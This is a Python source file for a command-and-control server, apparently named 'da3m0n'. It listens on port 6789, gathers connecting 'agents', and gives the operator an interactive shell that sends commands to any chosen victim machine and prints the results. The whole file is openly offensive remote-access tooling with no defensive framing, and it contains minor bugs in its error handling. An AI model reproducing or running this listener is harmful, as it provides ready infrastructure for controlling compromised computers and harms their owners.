import socket
import threading
import sys

thread_index = []
agent_index = []

def start_server(host='', port=6789):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind((host, port))
        server_socket.listen()
        display_header()
        print(f"Listening at {host}:{port}\nWaiting for incoming connections.\n")
        threading.Thread(target=await_connections, args=(server_socket,), daemon=True).start()
        terminal()
    except KeyboardInterrupt:
        print("\n\nServer shutting down...")
    finally:
        server_socket.close()
        print("Server terminated.\n")
        sys.exit(0)

def display_header():
    print("""       ____     _  ____  ____  ____  ____  ____ 
 ____ |__  | __| ||_   ||   _|| __ ||    ||_   |
|____| _/ / |__  | / | ||  |_ | |/ |||_| | / | |
      |____|   |_||/\\__/|____|\\___/ |_||_||/\\__/

01100100 01100001 00110011 01101101 00110000 01101110 
""")

def await_connections(server_socket):
    try:
        flag = False
        while flag != True:
            client_socket, addr = server_socket.accept()
            thread = threading.Thread(target=shell, args=(client_socket,addr))
            thread_index.append(thread)
            agent_index.append((client_socket, addr))
    except KeyboardInterrupt:
        print(f"Server shutting down...\n")
        server_socket.close()
        sys.exit(0)

def terminal():
    flag = False
    while flag != True:
        instruction = input('>> ')
        print("")
        if instruction == '!exit':
            print("\nTerminating server...")
            sys.exit(0)
        elif instruction == '!list':
            display_agents()
        elif instruction.startswith('!intrude'):
            index = int(instruction.split()[-1])
            client_socket, addr = agent_index[index]
            shell(client_socket, addr)
        else:
            print("")

def display_agents():
    if agent_index:
        print("Agents gathered:")
        for i, (sock, addr) in enumerate(agent_index):
            print(f"  {i}: {addr}")
        print("")
    else:
        print("No agents indexed.\n")

def shell(client_socket, addr):
    try:
        flag = False
        while flag != True:
            prompt = input(f'Shell@{addr[0]}:{addr[1]} >>> ')
            print("")
            if prompt == '!exit':
                print("Terminating server...")
                client_socket.close()
                raise KeyboardInterrupt
            if prompt == '!close':
                terminal()
            if prompt != "":
                client_socket.send(f"{prompt}".encode('utf-8'))
                message = client_socket.recv(4096).decode('utf-8')
            else:
                print("No command specified\n")
            if message:
                print(f"{message}")
                message = ''
    except Exception:
        print(f"An error has occurred.\nShutting down {addr[1]}:{addr[2]} connection's.\n")
    finally:
        client_socket.close()
        exit

if __name__ == "__main__":
    start_server()

